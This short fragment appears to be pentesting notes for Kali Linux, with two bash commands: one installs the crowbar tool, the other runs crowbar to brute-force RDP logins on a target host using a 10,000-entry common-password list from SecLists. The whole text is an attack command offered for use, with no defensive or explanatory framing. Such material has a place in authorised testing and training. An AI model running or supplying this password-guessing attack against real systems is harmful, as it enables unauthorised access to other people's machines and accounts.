```bash - kali
sudo apt install crowbar
```

```bash - kali
crowbar -b rdp -s $TARGET/32 -u $USER -C /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -n 1
```